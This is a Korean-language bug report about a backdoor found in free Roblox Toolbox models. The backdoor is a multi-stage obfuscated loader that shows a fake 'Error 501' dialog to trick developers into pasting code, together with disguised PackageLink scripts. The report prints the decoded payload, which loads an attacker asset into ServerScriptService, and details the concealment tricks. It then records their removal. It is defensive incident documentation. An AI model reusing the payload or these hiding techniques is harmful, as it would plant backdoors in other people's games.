---
title: "BUG-0008 무료 모델에 섞여 들어온 백도어 (가짜 Error 501)"
tags: [bug, security]
---

# BUG-0008 — 무료 모델에 섞여 들어온 백도어 (가짜 Error 501)

| 항목 | 값 |
| --- | --- |
| 상태 | fixed (2026-07-19) |
| 심각도 | critical |
| 관련 시스템 | 프로젝트 전역 (툴박스 에셋) |
| 발견일 | 2026-07-19 |

## 증상

플레이 중 화면 배경이 흐려지며 중앙에 아래 문구가 떴다.

> Error 501 — Something went wrong with this game.
> It appears there is an issue with a model causing the game to crash.
> To fix this, copy the text in textbox, stop the game, and paste it into the command bar.

로블록스가 내는 오류처럼 보이지만 로블록스는 이런 창을 띄우지 않는다. 개발자가 텍스트박스 내용을 커맨드 바에 붙여넣도록 유도하는 사회공학 공격이다.

## 원인

무료(툴박스) 모델에 백도어 스크립트가 섞여 들어와 있었다. 통로가 두 갈래였다.

### ① 가짜 에러창 — 다단계 로더

`Workspace.Folder` 안, 파트가 0개인 껍데기 Model에 숨어 있었다. 경로 자체가 은폐 수단이다.

```
Folder > Model > Script > Value > Script > Value > SurfaceWeld
```

`Script` / `Value` / `SurfaceWeld` 처럼 의미 없는 이름을 겹쳐 탐색기에서 눈에 띄지 않게 했다. 클래스가 `Script`인데 이름이 `SurfaceWeld`인 것 자체가 위장이다.

동작 순서:

1. 1단계 `Script` — 속성 `hm`에 든 역순 문자열을 뒤집어 해독하고, 하위 `StringValue`의 속성에 심은 뒤 다음 단계를 활성화
2. `LocalScript` — `script.Parent = nil`로 자신을 탐색기에서 지우고, 모든 `CoreGui`를 비활성화해 메뉴·채팅을 차단
3. `SurfaceWeld` — `BlurEffect` + 가짜 경고창 + 복사용 `TextBox`(`ClearTextOnFocus = false`) 표시

해독된 페이로드는 다음과 같았다.

```lua
local a = game:GetObjects("rbxassetid://89945969498547")[1]
if a then a.Parent = game.ServerScriptService end
```

공격자 스크립트를 `ServerScriptService`에 설치하는 코드다. 서버 스크립트 폴더에 들어가면 사실상 게임 전권을 갖는다.

문구와 명령어를 소스가 아니라 난독화된 이름의 속성(`fdnsanDKLANknl231`, `DJakmdjOA1`)에 넣고 런타임에 채우는 방식이라, 소스 전문 검색으로는 `Error 501` 문자열이 잡히지 않았다.

### ② 외부 코드 유입 통로 — 가짜 PackageLink

`Script` 클래스인데 이름이 `PackageLink`인 스크립트 12개. 진짜 로블록스 패키지의 `PackageLink`는 엔진 객체이지 스크립트가 아니다.

자식 ModuleScript의 속성 `Version`에 에셋 ID(`116693032735112`)를 숨겨두고 `require`했다. 소스에 숫자가 없어 `require(%d+)` 검색을 회피한다.

| 위치 | 개수 |
| --- | --- |
| `Workspace.Alarme Light red RazTekYT` | 10 |
| `Workspace.Part` | 2 |

## 조치

내용 확인 후 아래 14개만 삭제했다. 파트를 가진 오브젝트는 건드리지 않아 맵에 시각적 변화가 없다.

| 대상 | 개수 |
| --- | --- |
| 501 로더 Model (파트 0개 껍데기) | 1 |
| Credits 변종 `StyleSheet 'Extra'` (같은 계열, 파트 0개) | 1 |
| 가짜 `PackageLink` 스크립트 | 12 |

### 왜 관중 NPC는 남겼나

같은 `Folder` 안에 관중 NPC 57개(파트 419개)가 함께 있었으나, 스크립트 88개를 전수 검사한 결과 위험 패턴이 0건이었다. 구성도 `Animate` / `Health` / `LoopJump` / `RobloxTeam` 등 로블록스 기본 캐릭터 스크립트뿐이었다. 통째로 지우면 관중석이 비므로 껍데기 2개만 들어냈다.

## 결과

삭제 후 검증에서 501 패턴 0건, PackageLink 0건이었다. 워크스페이스 최상위 전체(스크립트 119·88·76·53개짜리 대형 모델 포함)를 재검사해 추가 감염이 없음을 확인했다.

자기복제 여부도 확인했다. 두 악성 스크립트의 `Clone()`은 각각 1회뿐이고 대상이 명확하다(플레이어 GUI 복사용). `DescendantAdded` 훅, `InsertService`, `GetObjects` 실행은 없다. 스스로 퍼지지 않으며, 개발자가 직접 커맨드 바에 붙여넣어야만 감염이 성립한다. 이번 건은 실행되지 않았다.

상시 점검용 스캐너를 `ServerStorage.SecurityScan`으로 두었다. 커맨드 바에서 실행한다.

```lua
require(game.ServerStorage.SecurityScan)()
```

읽기 전용이라 아무것도 지우지 않고 보고서만 출력한다.

## 구현 위치

- `ServerStorage.SecurityScan` (신규) — 읽기 전용 백도어 패턴 스캐너.

## 관련

- [LESSON-0004](../lessons/LESSON-0004-toolbox-asset-safety.md)

## 변경 로그

- 2026-07-19: 백도어 14개 제거, 전역 재검사 통과, `SecurityScan` 모듈 도입.
